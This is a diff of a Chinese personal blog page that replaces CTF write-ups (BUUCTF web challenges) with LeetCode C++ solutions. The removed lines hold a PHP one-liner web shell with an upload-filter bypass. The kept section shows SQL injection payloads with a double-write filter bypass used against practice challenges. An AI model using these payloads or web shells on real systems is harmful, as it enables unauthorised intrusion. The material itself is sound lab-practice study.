@@ -4,31 +4,15 @@
   <meta charset="utf-8">
   
   
-  <title>Buuctf Web（13-16） | qinyiwen</title>
+  <title>20240220 | qinyiwen</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="Buuctf Web（13-16）13、Upload创建一个木马文件 可绕过的后缀名检测：php,php3,php4,php5,phtml.pht  上传该文件，显示Not image!   抓包，修改Content-Type的内容为 image&#x2F;jpeg，send，查看文件名后缀应为.phtml  使用蚁剑 URL地址为：&#x2F;upload&#x2F;a.phtml 连接密码为：a 测试连接，连接成功后添加">
+  <meta name="description" content="LeetCode各位相加addDigits函数接受一个整数num作为参数，然后通过一个while循环来计算各位数字相加的结果。在循环中，首先将num的个位数字加到sum中，然后将num除以10，以便在下一次循环中继续计算下一位数字。当num变为0时，说明已经计算完所有位上的数字，此时判断sum的值是否小于10，如果小于10则直接返回sum作为结果；如果大于等于10，则将sum赋值给num，然后将s">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Buuctf Web（13-16）">
-<meta property="og:url" content="http://example.com/2023/08/09/Buuctf%20Web%EF%BC%8813-16%EF%BC%89/index.html">
+<meta property="og:title" content="20240220">
+<meta property="og:url" content="http://example.com/2024/02/20/20240220/index.html">
 <meta property="og:site_name" content="qinyiwen">
-<meta property="og:description" content="Buuctf Web（13-16）13、Upload创建一个木马文件 可绕过的后缀名检测：php,php3,php4,php5,phtml.pht  上传该文件，显示Not image!   抓包，修改Content-Type的内容为 image&#x2F;jpeg，send，查看文件名后缀应为.phtml  使用蚁剑 URL地址为：&#x2F;upload&#x2F;a.phtml 连接密码为：a 测试连接，连接成功后添加">
+<meta property="og:description" content="LeetCode各位相加addDigits函数接受一个整数num作为参数，然后通过一个while循环来计算各位数字相加的结果。在循环中，首先将num的个位数字加到sum中，然后将num除以10，以便在下一次循环中继续计算下一位数字。当num变为0时，说明已经计算完所有位上的数字，此时判断sum的值是否小于10，如果小于10则直接返回sum作为结果；如果大于等于10，则将sum赋值给num，然后将s">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/d5773950-aba3-4d69-a0d9-9c2fe6191a33">
-<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/8b9a3900-f491-4db5-93ce-7f7b44e9b7a6">
-<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/5051e49c-61ef-4826-9d5e-7cf5f8a80d93">
-<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/60a1de1b-9b4e-43d7-a5fd-ee5509f92155">
-<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/db0568d7-6c26-4c82-9143-76b47e48f6c1">
-<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/257b7d7f-ab0b-40ff-8b31-f6fd24c64273">
-<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/ad1fc581-4537-4c03-ac3f-bd0b85cb88e2">
-<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/e2bff410-6c2e-406d-a06b-ae6b6d83e92b">
-<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/c12f4d12-96db-41d7-8f3a-6e9c6d95deb0">
-<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/52dea5e6-0636-44ab-a307-104363826373">
-<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/3cac98aa-ef81-4468-a8ef-e0792d7a8c6d">
-<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/455b5f6b-955a-4acc-98f4-1e4766489658">
-<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/6d2c4b89-6449-40f7-b266-2fb166362b62">
-<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/d91e8710-36d0-45ea-b5af-941f2b401a04">
-<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/9ca56033-b394-40c2-8378-bcc65f53e15b">
-<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/9166d150-0624-44fd-b1ef-9fea0ea3dfef">
 <meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/ed301d3e-a195-4d86-abb1-871db2c6eb2c">
 <meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/5d921e6b-5869-498e-a14a-4aa76ccf65b2">
 <meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/d4eaa532-463d-46e8-a088-2e411973852d">
@@ -45,12 +29,12 @@
 <meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/ae9dc2e9-205f-41ab-916a-2d1f257c26ed">
 <meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/92a4085c-3183-425c-90bf-5175c5f4b940">
 <meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/6916ddd3-236d-4ee7-9d17-962c0187f537">
-<meta property="article:published_time" content="2023-08-09T09:14:13.000Z">
-<meta property="article:modified_time" content="2023-08-10T15:35:45.812Z">
+<meta property="article:published_time" content="2024-02-20T12:41:36.000Z">
+<meta property="article:modified_time" content="2024-02-20T12:49:32.433Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="learn">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/d5773950-aba3-4d69-a0d9-9c2fe6191a33">
+<meta name="twitter:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/ed301d3e-a195-4d86-abb1-871db2c6eb2c">
   
     <link rel="alternate" href="/atom.xml" title="qinyiwen" type="application/atom+xml">
   
@@ -109,10 +93,10 @@
 </header>
 
       <div class="outer">
-        <section id="main"><article id="post-Buuctf Web（13-16）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+        <section id="main"><article id="post-20240220" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2023/08/09/Buuctf%20Web%EF%BC%8813-16%EF%BC%89/" class="article-date">
-  <time class="dt-published" datetime="2023-08-09T09:14:13.000Z" itemprop="datePublished">2023-08-09</time>
+    <a href="/2024/02/20/20240220/" class="article-date">
+  <time class="dt-published" datetime="2024-02-20T12:41:36.000Z" itemprop="datePublished">2024-02-20</time>
 </a>
     
   </div>
@@ -123,7 +107,7 @@
         
   
     <h1 class="p-name article-title" itemprop="headline name">
-      Buuctf Web（13-16）
+      20240220
     </h1>
   
 
@@ -131,49 +115,16 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h3 id="Buuctf-Web（13-16）"><a href="#Buuctf-Web（13-16）" class="headerlink" title="Buuctf Web（13-16）"></a>Buuctf Web（13-16）</h3><h4 id="13、Upload"><a href="#13、Upload" class="headerlink" title="13、Upload"></a>13、Upload</h4><p>创建一个木马文件</p>
-<p>可绕过的后缀名检测：<code>php,php3,php4,php5,phtml.pht</code></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d5773950-aba3-4d69-a0d9-9c2fe6191a33" alt="image"></p>
-<p>上传该文件，显示Not image!</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8b9a3900-f491-4db5-93ce-7f7b44e9b7a6" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/5051e49c-61ef-4826-9d5e-7cf5f8a80d93" alt="image"></p>
-<p>抓包，修改<code>Content-Type</code>的内容为 <code>image/jpeg</code>，send，查看文件名后缀应为.phtml</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/60a1de1b-9b4e-43d7-a5fd-ee5509f92155" alt="image"></p>
-<p>使用蚁剑</p>
-<p>URL地址为：<code>/upload/a.phtml</code></p>
-<p>连接密码为：<code>a</code></p>
-<p>测试连接，连接成功后添加</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/db0568d7-6c26-4c82-9143-76b47e48f6c1" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/257b7d7f-ab0b-40ff-8b31-f6fd24c64273" alt="image"></p>
-<p>右键单击，文件管理，查看根目录，找到flag</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ad1fc581-4537-4c03-ac3f-bd0b85cb88e2" alt="image"></p>
-<p>双击查看flag</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/e2bff410-6c2e-406d-a06b-ae6b6d83e92b" alt="image"></p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;34c3fd89-3b0b-450b-9953-287122b67247&#125;</span><br></pre></td></tr></table></figure>
+        <h4 id="LeetCode"><a href="#LeetCode" class="headerlink" title="LeetCode"></a>LeetCode</h4><h5 id="各位相加"><a href="#各位相加" class="headerlink" title="各位相加"></a>各位相加</h5><p>addDigits函数接受一个整数num作为参数，然后通过一个while循环来计算各位数字相加的结果。在循环中，首先将num的个位数字加到sum中，然后将num除以10，以便在下一次循环中继续计算下一位数字。当num变为0时，说明已经计算完所有位上的数字，此时判断sum的值是否小于10，如果小于10则直接返回sum作为结果；如果大于等于10，则将sum赋值给num，然后将sum重置为0，继续下一轮计算。最终返回的sum即为各位数字相加的结果。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">addDigits</span><span class="params">(<span class="type">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(num!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sum+=num%<span class="number">10</span>;</span><br><span class="line">            num=num/<span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span>(num==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(sum&lt;<span class="number">10</span>) <span class="keyword">return</span> sum;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    num=sum;</span><br><span class="line">                    sum=<span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
-<h4 id="14、Upload"><a href="#14、Upload" class="headerlink" title="14、Upload"></a>14、Upload</h4><p>上传一句话木马<code>&lt;?php eval($_POST[a]);?&gt;</code>，修改后缀名为<code>.jpg</code></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c12f4d12-96db-41d7-8f3a-6e9c6d95deb0" alt="image"></p>
-<p>抓包，显示上传成功</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/52dea5e6-0636-44ab-a307-104363826373" alt="image"></p>
-<p>使用蚁剑连接，URL地址为：<code>http://458e3dd3-d7c3-41c5-b4cd-06727f565048.node4.buuoj.cn:81/./uplo4d/394659692a460258b45a99f1424ea357.jpg</code></p>
-<p>连接密码为：<code>a</code></p>
-<p>尝试一下，测试连接显示返回数据为空</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3cac98aa-ef81-4468-a8ef-e0792d7a8c6d" alt="image"></p>
-<p>尝试修改后缀名为.phtml</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/455b5f6b-955a-4acc-98f4-1e4766489658" alt="image"></p>
-<p>使用蚁剑连接，URL地址为：<code>http://458e3dd3-d7c3-41c5-b4cd-06727f565048.node4.buuoj.cn:81/./uplo4d/71056c0c9cb12f2b7d720156da9eabf1.phtml</code></p>
-<p>连接密码为：<code>a</code></p>
-<p>测试连接，连接成功 后添加</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6d2c4b89-6449-40f7-b266-2fb166362b62" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d91e8710-36d0-45ea-b5af-941f2b401a04" alt="image"></p>
-<p>右键单击，文件管理</p>
-<p>在根目录中找到flag</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9ca56033-b394-40c2-8378-bcc65f53e15b" alt="image"></p>
-<p>双击查看flag</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9166d150-0624-44fd-b1ef-9fea0ea3dfef" alt="image"></p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8337ba06-02fe-47b4-8563-e341d08b19fe&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="丑数"><a href="#丑数" class="headerlink" title="丑数"></a>丑数</h5><p>isUgly函数接受一个整数n作为参数，然后通过三重循环来计算所有可能的2、3、5的指数组合，然后判断是否等于n。如果等于n，则返回true，表示n是一个丑数；如果循环结束都没有找到符合条件的组合，那么返回false，表示n不是一个丑数。这段代码的时间复杂度较高，因为通过三重循环计算所有可能的指数组合会导致算法效率低下，更好的解决方案是通过不断除以2、3、5来简化n，直到n变为1或者无法再被2、3、5整除为止。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isUgly</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n&lt;=<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,z=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">20</span>;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(z=<span class="number">0</span>;z&lt;<span class="number">14</span>;z++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="built_in">pow</span>(<span class="number">2</span>,i)*<span class="built_in">pow</span>(<span class="number">3</span>,j)*<span class="built_in">pow</span>(<span class="number">5</span>,z)==n) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
-<h4 id="15、BabySQL"><a href="#15、BabySQL" class="headerlink" title="15、BabySQL"></a>15、BabySQL</h4><p>常规注入：<code>/check.php?username=admin&amp;password=1&#39; union select 1#</code></p>
+<h5 id="丢失的数字"><a href="#丢失的数字" class="headerlink" title="丢失的数字"></a>丢失的数字</h5><p>missingNumber函数接受一个整数数组nums作为参数，首先对nums进行排序，然后获取nums的长度n。接着判断特殊情况：若数组只有一个元素，则返回1减去该元素的值；若数组的第一个元素不是0，则返回0（因为0是缺失的数字）。然后通过循环遍历数组中的元素，找到第一个不连续的数字，即当前数字和下一个数字之差不为1，此时缺失的数字就是当前数字加1。最终返回的结果即为缺失的数字。这段代码的时间复杂度为O(nlogn)，因为对数组进行了排序操作。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">missingNumber</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>-nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(nums[<span class="number">0</span>]!=<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i+<span class="number">1</span>]-nums[i]!=<span class="number">1</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums[i]+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="BuuCTF"><a href="#BuuCTF" class="headerlink" title="BuuCTF"></a>BuuCTF</h4><h5 id="15、BabySQL"><a href="#15、BabySQL" class="headerlink" title="15、BabySQL"></a>15、BabySQL</h5><p>常规注入：<code>/check.php?username=admin&amp;password=1&#39; union select 1#</code></p>
 <p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ed301d3e-a195-4d86-abb1-871db2c6eb2c" alt="image"></p>
 <p>根据报错信息，猜测union 、select可能被过滤了，试一下双写绕过<br><code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1#</code></p>
 <p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/5d921e6b-5869-498e-a14a-4aa76ccf65b2" alt="image"></p>
@@ -190,7 +141,7 @@
 <p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6b20f762-65b5-42c8-8cad-00ac5910ed6e" alt="image"></p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;009a3737-39ae-44ff-8bfb-45287b1e2093&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="16、PHP"><a href="#16、PHP" class="headerlink" title="16、PHP"></a>16、PHP</h4><p>题目提示了备份网站</p>
+<h5 id="16、PHP"><a href="#16、PHP" class="headerlink" title="16、PHP"></a>16、PHP</h5><p>题目提示了备份网站</p>
 <p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/18c18833-30dc-498d-acf7-4095c042798c" alt="image"></p>
 <p>使用目录扫描工具 dirsearch</p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wuhongbin/p/14048052.html">目录扫描工具 dirsearch 使用详解 - FreeK0x00 - 博客园 (cnblogs.com)</a></p>
@@ -240,11 +191,11 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/08/09/Buuctf%20Web%EF%BC%8813-16%EF%BC%89/" data-id="cll5bk8gt0000e4vfgrzth6zo" data-title="Buuctf Web（13-16）" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/20/20240220/" data-id="clsud4xcb0000dsvfftecac63" data-title="20240220" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/learn/" rel="tag">learn</a></li></ul>
 
     </footer>
   </div>
@@ -252,19 +203,10 @@
     
 <nav id="article-nav">
   
-    <a href="/2023/08/10/Buuctf%20Web%EF%BC%8817-20%EF%BC%89/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          Buuctf Web（17-20）
-        
-      </div>
-    </a>
   
-  
-    <a href="/2023/08/08/Buuctf%20Web%EF%BC%889-12%EF%BC%89/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2024/02/18/20240218/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">Buuctf Web（9-12）</div>
+      <div class="article-nav-title">20240218</div>
     </a>
   
 </nav>
